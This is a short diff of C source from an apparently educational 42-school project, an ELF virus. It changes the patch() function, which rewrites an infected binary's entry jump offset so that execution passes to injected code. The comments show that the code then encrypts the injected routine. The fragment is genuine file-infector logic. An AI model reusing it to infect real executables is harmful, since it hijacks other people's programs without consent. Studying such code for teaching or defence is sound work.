@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/04/04 17:02:59 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/09 14:47:18 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/09 16:54:45 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,16 +33,15 @@ void	patch(t_data *data, uint8_t *map, size_t size)
 	data->context = false;
 	uint8_t *dst;
 
-// step 6 : patch entrypoint
+	// step 6 : patch entrypoint
+
+	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
 	dst = map + (data->virus.note->p_offset + ((size_t)end - (size_t)start));
 	while (*dst != 0xe9)
 		dst++;
 	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
 		goto next;
-	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
-	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
-		goto next;
-
+	_memcpy(dst + 1, &data->bin_entry, 4);
 
 	// step 6.5 : encrypt infected inject()
 	dst = map + (data->virus.note->p_offset + ((size_t)inject - (size_t)start));
